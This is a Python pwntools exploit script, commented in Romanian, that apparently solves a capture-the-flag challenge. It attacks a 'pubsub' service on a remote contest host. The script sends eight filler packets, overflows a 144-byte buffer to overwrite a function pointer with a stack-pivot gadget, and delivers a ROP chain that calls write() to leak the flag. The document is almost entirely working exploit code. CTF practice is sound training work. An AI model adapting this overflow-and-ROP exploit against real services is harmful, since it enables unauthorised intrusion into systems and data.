#!/usr/bin/env python3
from pwn import *
import struct
import time

# setari de baza
context.log_level = 'error' # sa nu faca spam
binary = ELF("./pubsub")

# adrese importante luate din gdb/objdump
# gadgetul magic: add esp, 0x7c ; ret
PIVOT = 0x80499d0 
ADDR_WRITE = binary.plt['write']
ADDR_EXIT = binary.plt['exit']
ADDR_FLAG = binary.symbols['za_flag_31337']
RET_GADGET = 0x804901e # adresa unui ret simplu pt padding

HOST = "isc2025.root.sx"
PORT = 10015

def trimite_pachet(con, code, data):
    # impachetam manual ca e mai simplu
    # len (4 bytes) + code (2 bytes) + data
    pkt = p32(len(data)) + p16(code) + data
    con.send(pkt)
    time.sleep(0.05) # putin delay sa nu crape serveru

def exploit():
    print("[*] incerc sa ma conectez...")
    try:
        r = remote(HOST, PORT)
    except:
        print("[-] nu merge conexiunea")
        return

    # 1. umplem primele 8 sloturi cu gunoi (index 0-7)
    print("[*] umplem stiva...")
    for i in range(8):
        trimite_pachet(r, 0x1000, b"AAAA")
        r.recv(timeout=0.1)

    # 2. facem overflow pe al 9-lea (index 8)
    # am calculat offsetul 144 pana la logfunc
    print("[*] suprascriem logfunc...")
    payload = b"A" * 144
    payload += p32(PIVOT) # punem adresa gadgetului nostru
    
    trimite_pachet(r, 0x1000, payload)
    time.sleep(0.1)

    # 3. pregatim rop chain-ul
    # folosim un ret sled ca sa nimerim sigur
    print("[*] trimitem payload final...")
    
    rop = p32(RET_GADGET) * 50 # alunecam pe ret-uri

    # apelam write(1, flag_addr, 60)
    # fd 1 e stdout, speram sa mearga
    rop += p32(ADDR_WRITE)
    rop += p32(ADDR_EXIT)   # sa iasa frumos dupa, ca sa faca flush
    rop += p32(1)           # arg1: fd 1
    rop += p32(ADDR_FLAG)   # arg2: buffer flag
    rop += p32(60)          # arg3: lungime

    # trimitem ca pachet de debug (0x1337) ca sa declanseze logfunc
    trimite_pachet(r, 0x1337, rop)

    # 4. vedem ce am primit
    print("[*] asteptam flagul...")
    try:
        data = r.recvall(timeout=2)
        if b"Flag" in data or b"{" in data:
            print("\nEvrika! Uite flagul:")
            print(data.decode(errors='ignore'))
        else:
            print("Nu a mers, am primit doar:")
            print(data)
    except Exception as e:
        print("Eroare la citire:", e)
    
    r.close()

if __name__ == "__main__":
    exploit()
